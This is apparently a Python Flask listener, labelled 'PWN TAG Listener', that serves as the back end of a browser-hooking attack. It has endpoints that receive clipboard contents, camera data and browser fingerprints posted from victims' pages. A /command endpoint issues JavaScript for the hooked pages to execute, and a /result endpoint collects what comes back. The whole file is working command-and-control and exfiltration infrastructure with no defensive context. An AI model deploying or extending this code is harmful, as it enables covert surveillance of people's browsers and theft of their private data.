from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/cliplog', methods=['POST'])
def log_clip():
    try:
        print(f"[CLIPBOARD] {request.data.decode('utf-8')}")
    except Exception as e:
        print(f"[CLIPBOARD ERROR] {e}")
    return "ok"

@app.route('/camlog', methods=['POST'])
def log_cam():
    try:
        print(f"[CAMERA] {request.data.decode('utf-8')}")
    except Exception as e:
        print(f"[CAMERA ERROR] {e}")
    return "ok"

@app.route('/fingerprint', methods=['POST'])
def fingerprint():
    try:
        print(f"[FINGERPRINT] {request.json}")
    except Exception as e:
        print(f"[FINGERPRINT ERROR] {e}")
    return "ok"

@app.route('/testlog', methods=['POST'])
def testlog():
    try:
        print(f"[TEST LOG] {request.json}")
    except Exception as e:
        print(f"[TEST LOG ERROR] {e}")
    return "ok"

@app.route('/command')
def give_command():
    return "document.body.style.background='hotpink'"

@app.route('/result', methods=['POST'])
def result():
    try:
        print(f"[RESULT] {request.data.decode('utf-8')}")
    except Exception as e:
        print(f"[RESULT ERROR] {e}")
    return "ok"

if __name__ == '__main__':
    print("[*] PWN TAG Listener running on port 8081...")
    app.run(host='0.0.0.0', port=8081)
